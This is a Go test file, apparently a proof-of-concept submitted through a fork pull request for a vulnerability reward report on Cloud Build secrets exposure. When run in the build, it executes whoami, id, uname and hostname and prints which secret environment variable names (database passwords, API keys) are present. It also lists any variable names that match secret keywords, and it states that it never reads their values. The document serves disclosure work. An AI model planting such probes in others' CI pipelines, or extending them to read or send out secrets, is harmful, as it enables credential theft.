// Copyright 2026 Maturi Jaswanth Sai Madhu Mohan
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Proof-of-environment probe for VRP issue 574158157 (packet-12, fork-PR secrets boundary).
//
// Purpose: the integration cloud-build config declares secretEnv values that resolve
// in-database-toolbox builds. Public check-run evidence (EVIDENCE/20-fork-pr-config-vs-code-control.txt)
// shows fork-PR builds run fork-authored code without an approval hold. This test answers,
// from inside a fork build, two questions the maintainer cannot answer from config alone:
//   1. what identity the compiled test runs as in the Google Cloud Build worker pool, and
//   2. whether the step's declared secretEnv names are present in the environment.
//
// SAFETY: this test is inert by construction. It reads only env var NAMES (values are
// never read, printed, hashed or transmitted), runs three read-only identity commands,
// performs no network I/O, opens no listeners, writes nothing outside the build
// workspace, and finally exits(1) to stop the test binary immediately so the shard
// fails fast and consumes minimum compute. Cleanup: close the PR afterwards. The
// findings are reported in the VRP thread and no part of this file is intended for merge.
package cloudsqlpg

import (
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"testing"
)

func TestInertPoCIdentityAndSecretEnvNames(t *testing.T) {
	fmt.Println("=== PWNPROOF INERT — VRP 574158157 fork-PR environment PoC ===")

	for _, c := range [][]string{{"whoami"}, {"id"}, {"uname", "-a"}, {"hostname"}} {
		out, err := exec.Command(c[0], c[1:]...).CombinedOutput()
		if err != nil {
			fmt.Printf("%s: error %v\n", c[0], err)
			continue
		}
		fmt.Printf("%s: %s", c[0], out)
	}

	wd, _ := os.Getwd()
	fmt.Printf("pwd: %s\n", wd)
	fmt.Printf("uid: %d  gid: %d  euid: %d  pid: %d\n", os.Getuid(), os.Getgid(), os.Geteuid(), os.Getpid())
	fmt.Printf("goos/goarch/version: %s/%s/%s\n", runtime.GOOS, runtime.GOARCH, runtime.Version())

	declared := []string{
		"CLOUD_SQL_POSTGRES_USER", "CLOUD_SQL_POSTGRES_PASS", "CLIENT_ID", "API_KEY",
		"DB_PASSWORD", "GOOGLE_API_KEY", "TOOLS_YAML_CONTENT", "SERVICE_ACCOUNT_EMAIL",
		"ALLOYDB_POSTGRES_USER", "ALLOYDB_POSTGRES_PASSWORD", "ALLOYDB_AI_NL_PASS",
	}
	fmt.Println("--- declared secretEnv names: presence only (values NEVER read) ---")
	for _, k := range declared {
		v, ok := os.LookupEnv(k)
		fmt.Printf("ENV %s present=%v nonempty=%v\n", k, ok, ok && len(v) > 0)
	}

	fmt.Println("--- every env NAME matching secret keywords (names only, values never read) ---")
	re := regexp.MustCompile(`(?i)(password|passwd|secret|token|api_?key|credential)`)
	for _, kv := range os.Environ() {
		name := strings.SplitN(kv, "=", 2)[0]
		if re.MatchString(name) {
			fmt.Printf("ENV-NAME-ONLY %s\n", name)
		}
	}

	fmt.Println("=== END PWNPROOF — deliberate exit(1) so no further test runs in this shard ===")
	// exit(1) mirrors the protocol documented in packet-11 FINAL-FOLLOWUP section 9 Option-B:
	// print, then stop, so nothing downstream consumes the run.
	os.Exit(1)
}
